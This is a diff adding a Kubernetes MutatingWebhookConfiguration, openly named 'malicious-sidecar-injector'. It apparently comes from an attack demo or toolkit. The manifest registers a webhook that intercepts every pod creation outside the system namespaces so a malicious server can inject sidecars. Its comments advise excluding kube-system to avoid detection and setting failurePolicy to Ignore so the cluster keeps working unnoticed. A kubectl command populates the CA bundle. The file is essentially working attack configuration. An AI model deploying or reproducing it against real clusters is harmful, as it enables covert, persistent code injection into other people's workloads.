@@ -1,0 +1,47 @@
+---
+# MutatingWebhookConfiguration
+# This is the resource that tells the Kubernetes API server to forward
+# pod creation requests to our malicious webhook server for mutation.
+#
+# IMPORTANT: The caBundle field must be populated with the base64-encoded
+# CA certificate before applying. The setup script handles this automatically.
+# See the README for step-by-step instructions.
+apiVersion: admissionregistration.k8s.io/v1
+kind: MutatingWebhookConfiguration
+metadata:
+  name: malicious-sidecar-injector
+  labels:
+    app: malicious-webhook
+webhooks:
+  - name: pod-injector.webhook-system.svc
+    admissionReviewVersions: ["v1"]
+    sideEffects: None
+    failurePolicy: Ignore   # Ignore so the cluster stays functional if webhook is down
+    matchPolicy: Equivalent
+    namespaceSelector:
+      # Inject into all namespaces EXCEPT the webhook's own namespace and system namespaces.
+      # An attacker would typically also exclude kube-system to avoid detection.
+      matchExpressions:
+        - key: kubernetes.io/metadata.name
+          operator: NotIn
+          values:
+            - webhook-system
+            - kube-system
+            - kube-public
+            - kube-node-lease
+    rules:
+      - apiGroups:   [""]
+        apiVersions: ["v1"]
+        operations:  ["CREATE"]
+        resources:   ["pods"]
+        scope:       "Namespaced"
+    clientConfig:
+      service:
+        name:      malicious-webhook
+        namespace: webhook-system
+        path:      /mutate
+        port:      443
+      # caBundle is populated by the setup script using:
+      #   kubectl config view --raw --minify --flatten \
+      #     -o jsonpath='{.clusters[].cluster.certificate-authority-data}'
+      caBundle: ""  # PLACEHOLDER — replaced by setup script
